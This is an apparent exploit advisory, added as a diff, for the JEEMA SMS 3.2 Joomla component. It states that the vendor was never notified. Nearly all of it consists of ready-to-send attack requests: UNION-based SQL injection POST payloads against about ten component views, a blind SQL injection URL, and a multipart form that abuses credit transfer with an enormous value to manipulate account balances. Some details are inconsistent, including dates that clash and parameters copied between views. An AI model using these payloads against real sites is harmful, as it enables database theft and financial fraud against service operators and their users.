@@ -1,0 +1,156 @@
+###################################################################
+JEEMA SMS 3.2 Component Joomla Multiple Vulnerabilities
+###################################################################
+
+Release Date Bug.          28-Oct-2011
+Date Added.                30-January-2010
+Vendor Notification Date.  Never
+Product.                   JEEMA SMS
+Platform.                  Joomla
+Affected versions.         3.2
+Type.                      Commercial
+Price.                     $115.00
+Attack Vector.             Multiple
+Solution Status.           unpublished
+CVE reference.             Not yet assigned
+Download.                  http://www.shopping.jeema.net/index.php?main_page=product_info&cPath=1&products_id=2&zenid=dc8442eed192c973fe776f9cd16a1a6c
+
+
+I. BACKGROUND
+
+JEEMA SMS is a Joomla 1.5 component which can be installed inside Joomla.
+The main purpose of this component is to configure any HTTP SMS API and you
+can start sending SMS. This component can be used as a reseller account.
+I.e) If you buy 10,000 SMS from a SMS provider and you can partition these 10,000
+SMS to distrubute among the members. 
+
+II. DESCRIPTION
+
+vulnerabilities are SQL injection, blind SQL injection, and message transfer credit
+
+
+III.  EXPLOITATION
+
+For the operation must first register
+
+
+
+SQL INJECTION
+::::::::::::::::::::::::::::::::::::::::
+
+
+//index.php?option=com_jeemasms&view=book&Itemid=2
+
+Post:
+filter_subsearch=') AND 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,10#&alias%5B1%5D=4-1&limit=20&limitstart=0&option=com_jeemasms&task=&view=book&boxchecked=&controller=&groupid=&sendfrom=book&filter_order=&filter_order_Dir=
+---
+//index.php?option=com_jeemasms&view=group&Itemid=3
+
+Post:
+filter_subsearch=') AND 1=2 UNION SELECT 1,2,3,4,5,6,7#&limit=20&limitstart=0&option=com_jeemasms&task=&view=group&boxchecked=&controller=&sendfrom=group&filter_order=&filter_order_Dir=
+--
+//index.php?option=com_jeemasms&view=history&Itemid=4
+
+Post:
+filter_subsearch=') AND 1=2 UNION SELECT 1,2,3,4,5,6,7#&limit=20&limitstart=0&option=com_jeemasms&task=&view=history&boxchecked=&controller=&sendfrom=history&filter_order=&filter_order_Dir=
+----
+//index.php?option=com_jeemasms&view=sender&Itemid=7
+
+Post:
+filter_subsearch=') AND 1=2 UNION SELECT 1,2,3,4,5#&limit=20&limitstart=0&option=com_jeemasms&task=&view=sender&boxchecked=&controller=&filter_order=&filter_order_Dir=
+---
+//index.php?option=com_jeemasms&view=keyword&Itemid=11
+
+Post:
+filter_subsearch=') AND 1=2 UNION SELECT 1,2,3,4,5#&limit=20&limitstart=0&option=com_jeemasms&task=&view=keyword&boxchecked=&controller=&filter_order=&filter_order_Dir=
+---
+//index.php?option=com_jeemasms&view=smstemplate&Itemid=13
+
+Post:
+filter_subsearch=') AND 1=2 UNION SELECT 1,2,3,4,5#&limit=20&limitstart=0&option=com_jeemasms&task=&view=smstemplate&boxchecked=&controller=&filter_order=&filter_order_Dir=
+--
+//index.php?option=com_jeemasms&view=csvsms&Itemid=14
+
+Post:
+filter_subsearch=') AND 1=2 UNION SELECT 1,2,3,4,5#&limit=20&limitstart=0&option=com_jeemasms&task=&view=smstemplate&boxchecked=&controller=&filter_order=&filter_order_Dir=
+--
+//index.php?option=com_jeemasms&view=invoice&Itemid=15
+
+Post:
+filter_subsearch=') AND 1=2 UNION SELECT 1,2,3,4,5#&limit=20&limitstart=0&option=com_jeemasms&task=&view=smstemplate&boxchecked=&controller=&filter_order=&filter_order_Dir=
+--
+//sms/index.php?option=com_jeemasms&view=smsschedule&Itemid=16
+
+Post:
+filter_subsearch=') AND 1=2 UNION SELECT 1,2,3,4,5#&limit=20&limitstart=0&option=com_jeemasms&task=&view=smstemplate&boxchecked=&controller=&filter_order=&filter_order_Dir=
+--
+//sms/index.php?option=com_jeemasms&view=senderrequest&Itemid=18
+
+Post:
+filter_subsearch=') AND 1=2 UNION SELECT 1,2,3,4,5#&limit=20&limitstart=0&option=com_jeemasms&task=&view=smstemplate&boxchecked=&controller=&filter_order=&filter_order_Dir=
+
+
+BLIND SQL INJECTION
+::::::::::::::::::::::::::::::::::::::::
+
+
+//index.php?option=com_jeemasms&view=groupsubscribe&task=groupsubscribe&Itemid=10&groupid=1+and+substring%28@@version,1,1%29=4
+
+
+
+MESSAGE TRANSFER CREDIT
+::::::::::::::::::::::::::::::
+
+//index.php?option=com_jeemasms&view=transfercredit&Itemid=17
+
+-----------------------------236921977120363\r\n
+Content-Disposition: form-data; name="memberid"\r\n
+\r\n
+383\r\n
+-----------------------------236921977120363\r\n
+Content-Disposition: form-data; name="transfercredits"\r\n
+\r\n
+10000000000000000000000000\r\n
+-----------------------------236921977120363\r\n
+Content-Disposition: form-data; name="acc_id"\r\n
+\r\n
+3\r\n
+-----------------------------236921977120363\r\n
+Content-Disposition: form-data; name="option"\r\n
+\r\n
+com_jeemasms\r\n
+-----------------------------236921977120363\r\n
+Content-Disposition: form-data; name="task"\r\n
+\r\n
+transfercredit\r\n
+-----------------------------236921977120363\r\n
+Content-Disposition: form-data; name="view"\r\n
+\r\n
+transfercredit\r\n
+-----------------------------236921977120363\r\n
+Content-Disposition: form-data; name="boxchecked"\r\n
+\r\n
+\r\n
+-----------------------------236921977120363\r\n
+Content-Disposition: form-data; name="controller"\r\n
+\r\n
+\r\n
+-----------------------------236921977120363--\r\n
+
+EXPLANATION
+
+-----------------------------236921977120363\r\n
+Content-Disposition: form-data; name="memberid"\r\n
+\r\n
+383\r\n
+-----------------------------236921977120363\r\n
+Content-Disposition: form-data; name="transfercredits"\r\n
+\r\n
+10000000000000000000000000\r\n
+
+name="memberid" ID a transfer
+name="transfercredits" Credit to transfer when passing on the balance will be negative so you can achieve the balance you want :).
+
+
+Discovered by.
+Chris Russell
